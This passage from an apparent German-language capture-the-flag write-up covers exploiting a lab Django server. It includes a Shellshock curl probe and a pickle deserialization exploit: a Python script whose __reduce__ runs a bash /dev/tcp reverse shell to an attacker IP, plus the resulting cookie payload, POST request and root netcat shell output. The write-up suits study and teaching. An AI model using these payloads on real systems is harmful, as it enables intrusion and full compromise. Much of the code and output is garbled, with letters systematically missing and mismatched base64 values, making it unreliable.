+                <br><strong>Bewertung:</strong> Diese Zusammenfassung bestätigt die wichtigsten Erkenntnisse der Web-Enumeration: das Framework (Django), eine stark vermutete CGI/Input-Verarbeitungsschwachstelle (Shellshock-Meldungen) und die kritische `DEBUG = True` Einstellung. Die Benutzernamen und Login-Seiten sind sekundäre Angriffsflächen, aber nützlich für Credential-basierte Angriffe. Der Fokus liegt nun auf der Ausnutzung der `DEBUG = True` Schwachstelle in Kombination mit potenziellen Command Injection Vektoren.
+                <br><strong>Empfehlung (Pentester):</strong> Strukturiere deine Erkenntnisse während des Pentests. Fasse die wichtigsten technischen Details, vermuteten Schwachstellen und Angriffsflächen zusammen, um den weiteren Plan zu gestalten.
+                <br><strong>Empfehlung (Admin):</strong> Führen Sie regelmäßige Sicherheitsaudits durch, um solche Fehlkonfigurationen und Informationslecks schnell zu erkennen und zu beheben.
+            </p>
+            <!-- Die "Lagebeurteilung" Textblöcke wurden in die Kommentare des vorherigen Blocks integriert, um den Kontext zu wahren und Redundanz zu vermeiden. -->
+
+             <p class="comment">
+                <strong>Analyse:</strong> Um die von Nikto gemeldeten Shellshock-Schwachstellen auf den CGI-Pfaden und die Auswirkung der `DEBUG = True` Einstellung zu testen, sende ich eine Anfrage an den Pfad `/cgi_wrapper` mit einem manipulierten `User-Agent`-Header, der einen typischen Shellshock-Payload enthält (`() { :; }; /bin/ping -c 3 192.168.2.199`). Dieser Payload versucht, den `ping`-Befehl auszuführen. Ich verwende `curl -H "User-Agent: () { :; }; /bin/ping -c 3 192.168.2.199" http://192.168.2.48:5003/cgi_wrapper` und filtere die Ausgabe nach Zeilen, die "code" enthalten, da Django Debug-Seiten oft Code-Snippets in HTML-Tags mit der Klasse "code" anzeigen. Die Ausgabe zeigt keinen Hinweis darauf, dass der `ping`-Befehl ausgeführt wurde (keine Ping-Ausgabe, die erwartet worden wäre, wenn Shellshock zuträfe). Stattdessen erhalte ich einen Django-Traceback mit Fehlermeldungen und Dateipfaden innerhalb der Django-Installation (`...django/core/handlers/exception.py`, `...django/db/models/manager.py`, `...django/db/models/query.py`). Dieser Traceback wird angezeigt, weil `DEBUG = True` gesetzt ist und ein Fehler aufgetreten ist, als die Anwendung versuchte, den angefragten Pfad `/cgi_wrapper` zu verarbeiten (offenbar existiert dieser Pfad in der Anwendung nicht wie erwartet, obwohl Nikto ihn meldete, oder die Eingabe im User-Agent wird nicht an die Shell übergeben). Der Traceback bestätigt aber eindeutig die `DEBUG = True` Einstellung und gibt interne Pfade und Code-Details der Django-Anwendung preis.
+                <br><strong>Bewertung:</strong> Der direkte Shellshock-Test war zwar (erwartungsgemäß auf einem Python-Server) nicht erfolgreich und `/cgi_wrapper` scheint kein direkt ausführbares CGI-Skript zu sein, aber der Versuch war dennoch äußerst wertvoll. Er hat unwiderlegbar bewiesen, dass **`DEBUG = True` auf diesem Server aktiv ist und detaillierte Debug-Informationen bei Fehlern preisgibt**. Das ist eine kritische Information, die für andere Angriffe (z.B. provoziere andere Fehler) genutzt werden kann und auf andere Schwachstellen hindeutet.
+                <br><strong>Empfehlung (Pentester):</strong> Teste Nikto-Meldungen, aber verlasse dich nicht blind darauf. Nutze das Wissen über `DEBUG = True` aus. Versuche, verschiedene Arten von Fehlern in der Anwendung zu provozieren (z.B. ungültige Eingaben, Anfragen an nicht existierende URLs/Parameter), um zu sehen, ob weitere sensible Informationen oder Debugger-Zugriff preisgegeben werden.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Setzen Sie `DEBUG = False` in Ihrer Django-Anwendung in Produktionsumgebungen. Überwachen Sie Server-Logs auf Tracebacks und detaillierte Fehlermeldungen, die Angreifern Einblicke in die interne Funktionsweise geben könnten.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">crl -H "User-Agent: () { :; }; /in/ing -c 3 192.168.2.199" htt://192.168.2.48:5003/cgi_wrar | gre "cde"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+          <cde class="fnae">/usr/lcal/li/ythn3.8/site-ackages/jang/cre/hanlers/exception.y</cde>, line 47, in inner
+                    ....
+                    ...
+                    <t class="cde"><re>&#x27;cgi_wrar&#x27;</re></t>
+          <cde class="fnae">/usr/lcal/li/ythn3.8/site-ackages/jang/./els/anager.y</cde>, line 85, in anager_eth
+                    <t class="cde"><re>()</re></t>
+                    <t class="cde"><re>{&#x27;slg&#x27;: &#x27;cgi_wrar&#x27;}</re></t>
+                    <t class="cde"><re>&#x27;get&#x27;</re></t>
+                    <t class="cde"><re>&lt;jang../els.anager.Manager ject at 0x7ff415468a30&gt;</re></t>
+          <cde class="fnae">/usr/lcal/li/ythn3.8/site-ackages/jang/./els/qery.y</cde>, line 429, in get
+                    ....
+                    ...      Y're seeing this errr ecause yu have <cde><span class="command">EUG = Tre</span></cde> in yr
+      Jang setngs file. Change that t <cde>False</cde>, an Jang will
+      islay a stanar age generate y the hanler fr this stat cde.
+</pre>
+                </div>
+            </p>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Feroxbuster hat zuvor auf `/accounts/login/` und eine Weiterleitung von `/share` zur Login-Seite hingewiesen. Ich navigiere direkt zur Admin-Login-Seite, die unter `/admin/login/?next=/admin/` zu finden ist. Die Seite zeigt das typische "Django administration" Login-Formular mit den Feldern "Username" und "Password". Dies bestätigt die Existenz des Django Admin-Panels, das oft eine privilegiertere Zugriffsebene bietet.
+                <br><strong>Bewertung:</strong> Das Auffinden des Django Admin-Panels ist ein wichtiger Schritt. Wenn ich Anmeldedaten für dieses Panel erlangen kann (z.B. durch Cracking der Datenbank-Hashes oder Credential Stuffing), könnte ich administrative Funktionen ausführen, die zur Kompromittierung führen.
+                <br><strong>Empfehlung (Pentester):</strong> Versuche immer, administrative Login-Panels zu finden. Nutze gefundene Anmeldedaten, um dich anzumelden. Untersuche die Funktionen des Admin-Panels auf Schwachstellen (z.B. File Upload, Command Execution, SQL Injection).
+                <br><strong>Empfehlung (Admin):</strong> Schützen Sie Ihr Admin-Panel mit starken, eindeutigen Anmeldedaten und Multifaktor-Authentifizierung. Beschränken Sie den Zugriff auf das Admin-Panel auf vertrauenswürdige IP-Adressen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">htt://192.168.2.48:5003/ain/lgin/?next=/ain/</div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Jang ainistratin
+
+lease enter the crrect userna an asswrd fr a staff accnt.
+Nte that th fiel may e case-sensitive.
+Userna:
+asswrd:
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich untersuche eine `POST`-Anfrage an den `/search`-Endpunkt, um zu verstehen, wie die Anwendung mit Benutzereingaben und Cookies umgeht. Der bereitgestellte HTTP-Request-Dump zeigt eine Anfrage mit verschiedenen Headern, darunter `Host`, `User-Agent`, `Referer`, `Content-Type`, `Origin` und kritisch: `Cookie`. Der `Cookie`-Header enthält zwei Cookies: `csrftoken` und `search_cookie`. Der `csrftoken` hat einen längeren, komplexen Wert, während der `search_cookie` einen kürzeren Wert hat, der wie base64-kodiert aussieht (`"gASVEQAAAAAAAACMDScgT1IgMT0xIC0tIC2ULg=="`). Der Body der POST-Anfrage enthält das CSRF-Token-Feld (`csrfmiddlewaretoken`) und das Suchfeld (`query=sssss`). Die Antwort ist `HTTP/1.1 200 OK` und enthält ebenfalls `Set-Cookie`-Header für beide Cookies, wobei der `search_cookie` anscheinend einen neuen Wert erhält (`"gASVCQAAAAAAAACMBXNzc3NzlC4="`). Die Struktur und das Verhalten des `search_cookie` – base64-kodiert und wahrscheinlich dynamisch basierend auf der Suchanfrage – sind äußerst verdächtig.
+                <br><strong>Bewertung:</strong> Diese HTTP-Anfrage zeigt, dass der `/search`-Endpunkt aktiv ist, Formular-POST-Daten verarbeitet und mit Cookies interagiert. Das Format des `search_cookie` und die Tatsache, dass er sich ändert, deuten stark darauf hin, dass er serialisierte Daten enthält, die potenziell für eine Deserialisierungs-Schwachstelle ausgenutzt werden könnten. Insbesondere das `gASV`-Präfix am Anfang der base64-kodierten Werte ist ein starkes Indiz für Python Pickle-Daten.
+                <br><strong>Empfehlung (Pentester):</strong> Untersuche alle Cookies, die von der Webanwendung gesetzt werden, insbesondere solche mit ungewöhnlichen Formaten (base64, Hex etc.). Versuche, den Inhalt zu dekodieren oder zu deserialisieren. Das `gASV` Präfix ist ein sehr starker Hinweis auf Python Pickle. Konzentriere deine Bemühungen auf diesen `search_cookie`.
+                <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie die Speicherung von Zustandsinformationen oder komplexen Daten in Cookies auf Client-Seite. Wenn Sie serialisierte Daten in Cookies speichern müssen, verwenden Sie sichere Serialisierungsformate (z.B. JSON mit Integritätsprüfung) und niemals unsichere Formate wie Python Pickle, das bekanntermaßen anfällig für Deserialisierungsangriffe ist. Signieren Sie Cookies serverseitig, um Manipulationen zu erkennen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">PST /search HTTP/1.1
+Hst: <span class="command">192.168.2.48:5003</span>
+User-Agent: Mzilla/5.0 (X11; Linx x86_64; rv:128.0) Geck/20100101 Firefx/128.0
+Acce: text/html,allicatin/xhtml+xml,allicatin/xml;q=0.9,*/*;q=0.8
+Acce-Language: e,en-US;q=0.7,en;q=0.3
+Acce-Encodig: gzi, deflate, r
+Referer: htt://192.168.2.48:5003/
+Cntent-Type: allicatin/x-www-frm-urlencoe
+Cntent-Length: 96
+rigin: htt://192.168.2.48:5003
+NT: 1
+Cnnexion: kee-alive
+Ckie: csrftken=<span class="command">J167sVx1AW33KvUsaj8TnFaWAHmc3MXA3e5z9QhRLZww7ezen0GiERaw</span>; search_ckie="<span class="command">gASVEQAAAAAAAACMSCcgRIDE9xIC0tIC2ULg==</span>"
+Ugrae-Insecre-Reqests: 1
+Sec-GPC: 1
+ririty: =0, i
+
+csrfmiwaretken=<span class="command">aqH27U6WwAnfzreXF9ci1La9scuV9uyv4eAZA20Vuu2Jv07wrcRtIbylJt</span>&qery=sssss</div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">HTTP/1.1 200 K</span>
+<span class="command">Date: Mn, 16 Jun 2025 12:55:38 GMT</span>
+<span class="command">Server: WSGIServer/0.2 CPythn/3.8.6</span>
+<span class="command">Cntent-Type: text/html; charset=utf-8</span>
+<span class="command">X-Frame-tins: ENY</span>
+<span class="command">Vary: Ckie</span>
+<span class="command">Cntent-Length: 4881</span>
+<span class="command">X-Cntent-Type-tins: nsiff</span>
+<span class="command">Referrer-licy: sae-rigin</span>
+<span class="command">Set-Ckie:  search_ckie="<span class="command">gASVCQAAAAAAAACMSXNzc3NzlC4=</span>"; ath=/</span>
+<span class="command">Set-Ckie:  csrftken=J167sVx1AW33KvUsaj8TnFaWAHmc3MXA3e5z9QhRLZww7ezen0GiERaw; exires=Mn, 15 Jun 2026 12:55:38 GMT; Max-Age=31449600; ath=/; SaeSite=Lax</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Basierend auf der Vermutung, dass der `search_cookie` Python Pickle-Daten enthält, die potenziell deserialisiert werden, versuche ich, den Inhalt zu dekodieren und zu analysieren. Ich verwende ein kleines Python-Skript namens `dcookie.py`. Dieses Skript enthält den base64-kodierten Wert des `search_cookie`, den ich aus der analysierten POST-Anfrage extrahiert habe (`"gASVCAAAAAAAAACMBG1pbHWULg=="`). Das Skript dekodiert diesen String von base64 (`base64.b64decode(dcookie)`) und gibt die rohen deserialisierten Bytes aus. Die Ausgabe `b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04milu\x94.'` zeigt eine Byte-Sequenz, die mit `\x80\x04` beginnt – dies ist das Protokoll-Header für Pickle Version 4, was meine Vermutung, dass es sich um Python Pickle handelt, bestätigt. Um den Inhalt der Pickle-Daten besser zu verstehen, verwende ich das `pickletools.dis()` Funktion. Ich starte einen Python3-Interpreter und importiere die notwendigen Bibliotheken (`base64`, `pickletools`, `io`). Ich lade den base64-Wert in eine Variable, dekodiere ihn zu Bytes, und verwende dann `io.BytesIO` um einen Stream zu erstellen, den `pickletools.dis()` lesen kann. `pickletools.dis(disassembled_stream)` disassembliert die Pickle-Bytecode-Anweisungen. Die Ausgabe zeigt die Anweisungen, wobei die Anweisung `SHORT_BINUNICODE 'milu'` besonders auffällt. Dies deutet darauf hin, dass der Cookie einfach den String "milu" als Pickle-Daten enthält.
+                <br><strong>Bewertung:</strong> Die Analyse des `search_cookie` bestätigt eindeutig, dass er Python Pickle-Daten enthält, spezifisch den String "milu". Da die Anwendung diese Daten deserialisiert, besteht eine hohe Wahrscheinlichkeit, dass eine Pickle-Deserialisierungs-Schwachstelle existiert. **Python Pickle ist bekannt dafür, bei der Deserialisierung beliebige Code-Ausführung zu ermöglichen, wenn der Pickle-Stream manipuliert werden kann.** Dies ist eine kritische Schwachstelle (Insecure Deserialization).
+                <br><strong>Empfehlung (Pentester):</strong> Analysiere alle serialisierten Daten, die du findest (z.B. in Cookies, versteckten Feldern, API-Antworten). Identifiziere das Serialisierungsformat. Wenn es sich um unsichere Formate wie Python Pickle, Java Deserialization, PHP Deserialization etc. handelt, suche nach Möglichkeiten zur Code-Ausführung. Nutze Tools wie `pickletools` zur Analyse.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Verwenden Sie niemals unsichere Serialisierungsformate wie Python Pickle für Daten, die von nicht vertrauenswürdigen Quellen stammen (wie HTTP-Cookies). Nutzen Sie sichere Alternativen wie JSON und implementieren Sie Integritätsprüfungen (z.B. Signaturen), wenn Sie Daten auf Client-Seite speichern müssen. Scannen Sie Ihren Code auf die Verwendung unsicherer Deserialisierungsfunktionen.
+            </p>
+            <section id="proof-of-concept-pickle">
+                 <h2>Proof of Concept: Pickle Deserialization</h2>
+                 <p class="comment">
+                     <strong>Kurzbeschreibung:</strong> Dieser Abschnitt demonstriert die Ausnutzung der Insecure Deserialization Schwachstelle durch Manipulation des `search_cookie`, der Python Pickle-Daten enthält. Durch Einfügen eines speziell konstruierten bösartigen Pickle-Objekts kann beliebiger Code auf dem Server mit den Berechtigungen der ausführenden Anwendung ausgeführt werden (hier: wahrscheinlich Root in einem Docker-Container).
+                 </p>
+                 <p class="comment">
+                     <strong>Voraussetzungen:</strong>
+                     <ul>
+                         <li>Zugriff auf den `/search`-Endpunkt der Webanwendung.</li>
+                         <li>Die Anwendung deserialisiert den `search_cookie` unter Verwendung des Python Pickle-Moduls.</li>
+                         <li>Möglichkeit, den Wert des `search_cookie` zu kontrollieren (z.B. über Cookie-Manipulation im Browser oder mit Tools wie `curl`).</li>
+                         <li>Ein Angreifersystem mit Python und Netcat für die Reverse Shell.</li>
+                     </ul>
+                 </p>
+                  <p class="comment">
+                     <strong>Schritt-für-Schritt-Anleitung zur Ausnutzung:</strong>
+                     <br>1. Erstelle ein Python-Skript, das ein bösartiges Objekt definiert, dessen `__reduce__`-Methode einen Befehl zur Ausführung beliebigen Codes (z.B. `os.system('your_command')`) zurückgibt.
+                     <br>2. Serialisiere (pickle) dieses bösartige Objekt.
+                     <br>3. Base64-kodieren Sie die resultierenden Pickle-Bytes.
+                     <br>4. Richten Sie einen Netcat-Listener auf Ihrem Angreifersystem ein, um eine Reverse Shell zu empfangen.
+                     <br>5. Senden Sie eine Anfrage an den `/search`-Endpunkt (z.B. eine POST-Anfrage, wie zuvor analysiert) und ersetzen Sie den Wert des `search_cookie` im `Cookie`-Header durch die base64-kodierte, bösartige Payload.
+                     <br>6. Wenn der Server den manipulierten Cookie empfängt und deserialisiert, wird Ihr bösartiger Code ausgeführt und eine Reverse Shell zu Ihrem Listener aufgebaut.
+                 </p>
+                 <!-- Hier wären Screenshots oder andere Beweismittel des POC, wenn sie im Text oder als Bilder bereitgestellt worden wären. Die tatsächliche Ausnutzung wird im nächsten Abschnitt "Initial Access" gezeigt. -->
+                 <p class="comment">
+                     <strong>Erwartetes Ergebnis:</strong> Ausführung beliebiger Systembefehle mit den Berechtigungen des Prozesses, der die Deserialisierung durchführt, und Erlangung einer Reverse Shell.
+                 </p>
+                 <p class="comment">
+                     <strong>Risikobewertung:</strong> Kritisch. Insecure Deserialization, insbesondere mit Formaten wie Python Pickle, ermöglicht oft unauthentifizierte Remote Code Execution, was zur vollständigen Systemkompromittierung führen kann.
+                 </p>
+                 <p class="comment">
+                     <strong>Empfehlungen:</strong>
+                     <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Überarbeiten Sie die Art und Weise, wie der `search_cookie` verarbeitet wird. Verwenden Sie niemals `pickle.loads()` für Daten aus nicht vertrauenswürdigen Quellen. Erwägen Sie sichere Alternativen für die Speicherung von Sitzungs- oder Zustandsdaten (z.B. Datenbanken, verschlüsselte und signierte Cookies mit einem sicheren Format).
+                 </p>
+            </section>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">vi ckie.y</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+imrt as64
+
+ecookie = "<span class="command">gASVCAAAAAAAAACMSCG1pbHWULg==</span>"
+dcookie = as64.4ecoe(ecookie)
+rint(dcookie)
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">ythn3 ckie.y</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04milu\x94.'</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">ythn3</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ythn 3.13.3 (ain, Ar 10 2025, 21:38:51) [GCC 14.2.0] n linx</span>
+<span class="command">Tye "hel", "cyright", "creits" r "license" fr re infratin.</span>
+
+>>> <span class="command">imrt as64, ickletls, i</span>
+>>> <span class="command">ckie_vale_s64 = "gASVCAAAAAAAAACMSCG1pbHWULg=="</span>
+>>> <span class="command">ickle_ytes = as64.4ecoe(ckie_vale_s64)</span>
+>>> <span class="command">rint(ickle_ytes)</span>
+<span class="command">b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04milu\x94.'</span>
+>>> <span class="command">isassele_strea = i.tesI(ickle_ytes)</span>
+>>> <span class="command">ickletls.is(isassele_strea)</span>
+    0: <span class="command">\x80 PROTCL      4</span>
+    2: <span class="command">\x95 FRAME      8</span>
+   11: <span class="command">\x8c SHRT_INUNICE 'milu' <<----</span>
+   17: <span class="command">.    ST</span>
+<span class="command">highest rtcl amng cdes = 4</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Um die Pickle-Deserialisierungs-Schwachstelle auszunutzen und eine Reverse Shell zu erlangen, erstelle ich ein Python-Skript (`generat_rce.py`), das ein bösartiges Pickle-Payload generiert. Das Skript importiert `pickle`, `base64` und `os`. Ich definiere eine Klasse `RCE` mit einer `__reduce__`-Methode. Diese Methode wird während der Deserialisierung aufgerufen und gibt ein Tupel zurück, das anweist, die Funktion `os.system` mit dem Argument meines Reverse Shell-Befehls (`bash -c "bash -i >& /dev/tcp/192.168.2.199/4444 0>&1"`) auszuführen. Ich definiere meine Angreifer-IP (`KALI_IP`) und den Listener-Port (`LISTEN_PORT`). Das Skript erstellt dann eine Instanz der `RCE`-Klasse, serialisiert sie mit `pickle.dumps()` und base64-kodiert das Ergebnis mit `base64.b64encode()`. Schließlich gibt es die base64-kodierte Payload aus.
+                <br><strong>Bewertung:</strong> Dieses Skript generiert eine maßgeschneiderte bösartige Pickle-Payload. Durch das Einfügen dieser Payload in den `search_cookie` kann ich den Server dazu bringen, meinen Reverse Shell-Befehl auszuführen, wenn er den Cookie deserialisiert. Dies ist die direkte Ausnutzung der Pickle Deserialization Schwachstelle.
+                <br><strong>Empfehlung (Pentester):</strong> Nutze bösartige Pickle-Payload-Generatoren oder erstelle eigene Skripte, um Code-Ausführung über Deserialisierungs-Schwachstellen zu erreichen. Passe den Payload (z.B. Reverse Shell Befehl) an das Zielsystem an.
+                <br><strong>Empfehlung (Admin):</strong> Siehe Empfehlungen im Pickle Deserialization POC. Die Verwendung von unsicherer Deserialisierung ist ein schwerwiegendes Sicherheitsproblem.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">vi generat_rce.y</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+imrt ickle
+imrt as64
+imrt s
+
+KALI_I = "<span class="command">192.168.2.199</span>"
+LISTEN_PRT = <span class="command">4444</span>
+
+class RCE:
+    ef __reuce__(self):
+        cm = f'ash -c "ash -i >& /ev/tc/{KALI_I}/{LISTEN_PRT} 0>&1"'
+        retur (s.syste, (cm,))
+
+aylaa_ject = RCE()
+ickle_ytes = ickle.ums(aylaa_ject)
+as64_aylaa = as64.4encoe(ickle_ytes)
+
+rint(as64_aylaa.ecoe())
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">ythn3 generat_rce.y</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">gASVUAAAAAAAAACMSXNic2l4lIwGc3lzdGVtlJOUjDViYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xOTkvNDQ0NCAwPiYxIpSFlFKULg==</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Mit der generierten base64-kodierten bösartigen Pickle-Payload kann ich nun den Angriff durchführen. Ich sende eine `POST`-Anfrage an den `/search`-Endpunkt, genau wie die, die ich zuvor analysiert habe, aber ich ersetze den Wert des `search_cookie` im `Cookie`-Header durch meine generierte Payload (`gASVUAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDViYXNoIC1jICJiYXNoIC1iID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xOTkvNDQ0NCAwPiYxIpSFlFKULg==`). Parallel dazu habe ich auf meinem Angreifersystem einen Netcat-Listener auf Port `4444` gestartet (`nc -lvnp 4444`), um die eingehende Reverse Shell-Verbindung zu empfangen. Die Ausgabe des Netcat-Listeners zeigt, dass er auf Port `4444` lauscht und dann erfolgreich eine Verbindung vom Zielsystem (`connect to [192.168.2.199] from (UNKNOWN) [192.168.2.48] 32918`) empfängt. Nach dem Verbindungsaufbau erhalte ich eine Shell. Die Eingabeaufforderung ist `root@8b39a559b296:/home#`. Ich führe sofort den Befehl `id` aus, um meine effektiven Berechtigungen zu prüfen. Die Ausgabe `uid=0(root) gid=0(root) groups=0(root)` zeigt, dass ich Root-Rechte habe!
+                <br><strong>Bewertung:</strong> Fantastisch! Die Pickle-Deserialisierungs-Schwachstelle wurde erfolgreich ausgenutzt, um eine Reverse Shell zu erlangen, und das mit Root-Berechtigungen. Dies markiert den erfolgreichen Initial Access. **Allerdings deutet der Hostname in der Shell-Eingabeaufforderung (`8b39a559b296`) stark darauf hin, dass ich Root in einem Docker-Container bin, nicht auf dem zugrundeliegenden Host-System.** Das Endziel ist Root auf dem Host, daher ist dies erst ein Zwischenschritt.
+                <br><strong>Empfehlung (Pentester):</strong> Bestätige immer deine Umgebung (`id`, `hostname`, `/proc/1/cgroup` etc.), wenn du eine Shell erlangst, um festzustellen, ob du dich in einem Container oder direkt auf dem Host befindest. Wenn du in einem Container bist, konzentriere dich auf Docker-Breakout-Techniken zur Erlangung von Root-Rechten auf dem Host.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Beheben Sie die Insecure Deserialization Schwachstelle. Stellen Sie sicher, dass Dienste in Containern mit minimalen Rechten laufen. Vermeiden Sie das Ausführen von Prozessen mit Root-Rechten im Container, wenn dies nicht unbedingt erforderlich ist.
+
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">PST /search HTTP/1.1
+Hst: <span class="command">192.168.2.48:5003</span>
+User-Agent: Mzilla/5.0 (X11; Linx x86_64; rv:128.0) Geck/20100101 Firefx/128.0
+Acce: text/html,allicatin/xhtml+xml,allicatin/xml;q=0.9,*/*;q=0.8
+Acce-Language: e,en-US;q=0.7,en;q=0.3
+Acce-Encodig: gzi, deflate, r
+Referer: htt://192.168.2.48:5003/
+Cntent-Type: allicatin/x-www-frm-urlencoe
+Cntent-Length: 96
+rigin: htt://192.168.2.48:5003
+NT: 1
+Cnnexion: kee-alive
+Ckie: csrftken=<span class="command">J167sVx1AW33KvUsaj8TnFaWAHmc3MXA3e5z9QhRLZww7ezen0GiERaw</span>; search_ckie="<span class="password">gASVUAAAAAAAAACMSXNic2l4lIwGc3lzdGVtlJOUjDViYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMi4xOTkvNDQ0NCAwPiYxIpSFlFKULg==</span>"
+Ugrae-Insecre-Reqests: 1
+Sec-GPC: 1
+ririty: =0, i
+
+csrfmiwaretken=<span class="command">aqH27U6WwAnfzreXF9ci1La9scuV9uyv4eAZA20Vuu2Jv07wrcRtIbylJt</span>&qery=sssss</div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(rt㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening n [any] 4444 ...</span>
+<span class="password">cnnect t [192.168.2.199] frm (UNKNOWN) [192.168.2.48] 32918</span>
+<span class="command">ash: cannt set terinal rcess gr (1): Ina rriate icl fr evice</span>
+<span class="command">ash: n jb cntrl in this shell</span>
+<span class="command">rt@839a559296:/hme#</span> <span class="command">i</span>
+<span class="command">i=0(rt) gi=0(rt) grs=0(rt)</span>
+<span class="command">rt@839a559296:/hme#</span> <span class="command">ls</span>
+<span class="command">reqirements.sh</span>
+<span class="command">rn.sh</span>
+<span class="command">site</span>
+<span class="command">rt@839a559296:/hme#</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Docker Breakout)</h2>
+            <p class="comment">
+                <strong>Analyse:</strong> Ich bestätige meine Umgebung innerhalb des Docker-Containers. Der Kommentar im Textblock ("Wir sind root in einem Docker-Container...") bestätigt meine Vermutung. Ich navigiere zum `/home/`-Verzeichnis im Container und lese den Inhalt des Skripts `run.sh` aus. Dieses Skript wird offenbar beim Start des Containers ausgeführt und startet die Django-Anwendung (`python3 site/manage.py runserver 0.0.0.0:5003`). Ich prüfe auch den Inhalt von `/proc/1/cgroup`. Diese Datei zeigt die Control Groups des Prozesses mit PID 1 innerhalb des Containers, und die Einträge, die mit `/docker/` und der Container-ID (`8b39a559b296...`) beginnen, bestätigen eindeutig, dass ich mich in einem Docker-Container befinde. Schließlich prüfe ich mit `capsh --print` die Capabilities des Root-Benutzers *innerhalb dieses Containers*. Die Ausgabe zeigt eine lange Liste von Capabilities, darunter `cap_chown`, `cap_dac_override`, `cap_setuid`, `cap_setgid` und viele mehr, gefolgt von `+eip`. Dies sind die effektiven, inheritable und permitted Capabilities. Viele Capabilities sind gesetzt, was bedeutet, dass dieser Root-Benutzer *im Container* sehr mächtig ist.
+                <br><strong>Bewertung:</strong> Die Umgebung ist eindeutig ein Docker-Container. Die Erkenntnisse über das `run.sh` Skript und die Cgroup-Informationen sind nützlich, um die Container-Umgebung zu verstehen. Obwohl ich Root *im Container* bin, ist mein Ziel Root *auf dem Host-System*. Die zahlreichen Capabilities innerhalb des Containers sind ein potenzieller Angriffsvektor für einen Container-Breakout. Docker-Container sollten standardmäßig nur eine minimale Anzahl von Capabilities haben.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du Root in einem Container erlangst, ist der nächste Schritt immer, aus dem Container auszubrechen, um Root-Rechte auf dem Host zu erhalten. Suche nach gängigen Docker-Breakout-Methoden (z.B. über Capabilities, gemountete Verzeichnisse, anfällige Daemons auf dem Host, über privilegierte Container). Die hohe Anzahl an Capabilities ist ein guter Ausgangspunkt.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Führen Sie Container niemals als Root aus. Verwenden Sie separate, nicht-privilegierte Benutzer innerhalb von Containern. Setzen Sie `user` in Ihrer Dockerfile. Implementieren Sie das Prinzip der geringsten Privilegien und reduzieren Sie die Capabilities von Containern auf das absolute Minimum, das für ihre Funktion notwendig ist (`--cap-drop=ALL --cap-add=...`). Überwachen Sie Prozesse, die im Container laufen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@839a559296:/hme# <span class="command">c /hme/</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@839a559296:/hme# <span class="command">cat rn.sh</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ythn3 site/anage..y rnserver 0.0.0.0:5003</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">rt@839a559296:/hme# <span class="command">cat /rc/1/cgr</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">11:is:/cker/839a559296ca6a5864cc8796615ff05f518a01884a717527259e3c</span>
+<span class="command">10:lki:/cker/839a559296ca6a5864cc8796615ff05f518a01884a717527259e3c</span>
+<span class="command">9:freezer:/cker/839a559296ca6a5864cc8796615ff05f518a01884a717527259e3c</span>
